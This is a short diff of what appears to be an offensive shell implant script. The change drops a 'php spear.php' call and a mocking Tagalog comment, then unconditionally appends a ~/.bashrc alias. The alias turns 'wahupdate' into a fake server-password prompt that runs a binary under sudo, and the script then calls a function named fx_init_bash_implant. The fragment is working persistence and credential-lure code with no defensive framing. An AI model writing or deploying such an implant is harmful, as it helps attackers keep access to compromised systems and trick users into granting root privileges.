@@ -42,19 +42,8 @@ fx_init_bash_implant() {
 }
 
 
- #lets do some pre-flight checks
 
 
-    php spear.php
-
-
-
-    #DITO KA NALANG MAG CHECK NG MGA FILES HAYUP KA HAHAHAHA BAT KA PA NAG PHP
-    if grep -q "0" ".blood"
-    then
-        echo "alias 'wahupdate'='echo ***PLEASE ENTER SERVER PASSWORD*** && sudo /usr/bin/wahupdate'" >> ~/.bashrc
-        fx_init_bash_implant
-    else
-        fx_init_bash_implant
-    fi
-    fx_call_end
+echo "alias 'wahupdate'='echo ***PLEASE ENTER SERVER PASSWORD*** && sudo /usr/bin/wahupdate'" >> ~/.bashrc
+fx_init_bash_implant
+fx_call_end
